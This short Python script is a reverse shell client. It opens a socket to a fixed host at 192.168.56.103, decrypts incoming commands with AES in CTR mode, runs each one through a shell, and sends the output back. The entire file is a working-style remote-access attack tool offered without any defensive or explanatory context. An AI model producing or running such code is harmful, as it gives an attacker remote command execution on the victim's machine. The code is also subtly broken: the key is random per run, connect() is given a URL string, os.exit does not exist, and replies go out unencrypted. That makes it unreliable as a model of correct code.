import socket, subprocess, os
from Crypto.Cipher import AES

counter = os.urandom(16)
key = os.urandom(32) 

def encrypt(msg):
	encrypt = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
	return encrypt.encrypt(msg)

def decrypt(msg):
	decrypt = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
	return decrypt.decrypt(msg)

def connect():

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("http://192.168.56.103"))

	while True:
		command = decrypt(s.recv(1024))

		if 'terminate' in command:
			s.close()
			os.exit(0)
			break

		else:
			CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			s.send( CMD.stdout.read() )
			s.send( CMD.stderr.read() )

def main():
	connect()
main()
